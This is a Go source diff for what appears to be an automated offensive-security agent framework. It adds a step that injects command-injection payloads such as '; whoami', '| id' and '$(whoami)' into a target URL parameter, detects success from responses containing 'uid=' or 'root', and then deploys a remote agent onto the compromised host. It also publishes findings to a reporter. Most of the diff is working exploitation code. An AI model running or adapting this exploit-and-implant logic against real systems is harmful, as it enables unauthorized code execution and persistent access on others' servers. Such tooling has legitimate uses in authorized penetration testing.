@@ -5,11 +5,14 @@ import (
 	"cal-project/internal/core/agent"
 	"cal-project/internal/core/bus"
 	"cal-project/internal/hands/scripts"
+	"cal-project/internal/hands/tools"
 	"cal-project/internal/hands/trt"
 	"context"
 	"fmt"
 	"log"
+	"net/url"
 	"os"
+	"regexp"
 	"strings"
 	"sync/atomic"
 	"time"
@@ -88,6 +91,28 @@ func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 	if c.agentPaw == "" {
 		c.reportObservation(cmdEvent.FromAgent, "Agent deployment failed: No agent PAW specified")
 		return
+	}
+
+	// ============================================================================
+	// P1: Verify RCE first before deploying agent
+	// ============================================================================
+	targetURL, parameter := c.extractTaskInfo(taskDesc)
+
+	if targetURL != "" && parameter != "" {
+		log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
+		verified, payload := c.verifyRCE(targetURL, parameter)
+
+		if !verified {
+			log.Printf("[%s] ⚠️ RCE verification failed - aborting agent deployment\n", c.id)
+			c.reportObservation(cmdEvent.FromAgent, "RCE verification failed - false positive, deployment aborted")
+			return
+		}
+
+		log.Printf("[%s] ✅ RCE verified with payload: %s\n", c.id, payload)
+		evidence := fmt.Sprintf("Command execution confirmed with payload: %s", payload)
+		c.reportVerifiedRCE(targetURL, payload, evidence)
+	} else {
+		log.Printf("[%s] ⚠️ No target URL/parameter extracted, proceeding with deployment without verification\n", c.id)
 	}
 
 	// Deploy agent using TRT API
@@ -230,4 +255,128 @@ func (c *CommandInjectionSpecialist) reportObservation(toAgent string, observati
 		Payload:   observation,
 	}
 	c.bus.Publish(toAgent, event)
+}
+
+// ============================================================================
+// RCE Verification Functions (P1 Implementation)
+// ============================================================================
+
+// extractTaskInfo parses task description to extract target URL and parameter
+// Expected format: "Deploy ... (target context: http://example.com?cmd=test)"
+func (c *CommandInjectionSpecialist) extractTaskInfo(taskDesc string) (targetURL string, parameter string) {
+	// Extract URL from "target context: URL"
+	re := regexp.MustCompile(`target context:\s*([^\s)]+)`)
+	matches := re.FindStringSubmatch(taskDesc)
+	if len(matches) < 2 {
+		return "", ""
+	}
+
+	fullURL := matches[1]
+
+	// Parse URL to extract parameter
+	parsedURL, err := url.Parse(fullURL)
+	if err != nil {
+		log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
+		return "", ""
+	}
+
+	// Get query parameters
+	queryParams := parsedURL.Query()
+	for param := range queryParams {
+		// Return base URL and first parameter found
+		baseURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parsedURL.Path)
+		return baseURL, param
+	}
+
+	return fullURL, ""
+}
+
+// verifyRCE attempts to verify command injection by executing test commands
+// Returns (success, payload) if RCE is confirmed
+func (c *CommandInjectionSpecialist) verifyRCE(targetURL string, parameter string) (bool, string) {
+	log.Printf("[%s] 🔥 Verifying RCE on: %s (param: %s)\n", c.id, targetURL, parameter)
+
+	// Determine payloads based on platform
+	var payloads []string
+	if strings.ToLower(c.platform) == "windows" {
+		payloads = []string{
+			"& whoami",
+			"| whoami",
+			"&& whoami",
+			"; whoami",
+		}
+	} else {
+		// Linux payloads
+		payloads = []string{
+			"; whoami",
+			"| id",
+			"$(whoami)",
+			"`whoami`",
+			"&& id",
+		}
+	}
+
+	// Create executor (use TRT remote executor)
+	executor := trt.NewRemoteExecutor(c.trtClient, c.agentPaw, c.platform)
+
+	for _, payload := range payloads {
+		log.Printf("[%s] Testing payload: %s\n", c.id, payload)
+
+		// Build test URL
+		testURL, err := url.Parse(targetURL)
+		if err != nil {
+			log.Printf("[%s] Failed to parse URL: %v\n", c.id, err)
+			continue
+		}
+
+		queryParams := testURL.Query()
+		queryParams.Set(parameter, payload)
+		testURL.RawQuery = queryParams.Encode()
+
+		// Execute HTTP request
+		response, err := tools.SimpleHTTPGet(c.ctx, executor, testURL.String())
+		if err != nil {
+			log.Printf("[%s] HTTP request failed: %v\n", c.id, err)
+			continue
+		}
+
+		// Check for command execution indicators
+		lowerResponse := strings.ToLower(response)
+		if strings.Contains(lowerResponse, "root") ||
+			strings.Contains(lowerResponse, "www-data") ||
+			strings.Contains(lowerResponse, "uid=") ||
+			strings.Contains(lowerResponse, "gid=") ||
+			strings.Contains(response, "nt authority") ||
+			strings.Contains(response, "\\") { // Windows path indicator
+
+			log.Printf("[%s] ✅ RCE verified! Response contains: %s\n", c.id, response[:100])
+			return true, payload
+		}
+	}
+
+	return false, ""
+}
+
+// reportVerifiedRCE publishes a Finding event to Reporter
+func (c *CommandInjectionSpecialist) reportVerifiedRCE(targetURL string, payload string, evidence string) {
+	finding := map[string]interface{}{
+		"type":        "CommandInjection",
+		"url":         targetURL,
+		"payload":     payload,
+		"severity":    "High",
+		"description": fmt.Sprintf("Verified CommandInjection vulnerability. \nEvidence: %s", evidence),
+		"timestamp":   time.Now().Format(time.RFC1123),
+	}
+
+	msgID := cmdiMessageCounter.Add(1)
+	event := bus.Event{
+		ID:        fmt.Sprintf("%s-finding-%d", c.id, msgID),
+		FromAgent: c.id,
+		ToAgent:   "BROADCAST",
+		Type:      bus.Finding,
+		Payload:   finding,
+	}
+	c.bus.Publish("Reporter-01", event)
+
+	log.Printf("[%s] ✅ Verified RCE: CommandInjection at %s\n", c.id, targetURL)
 }
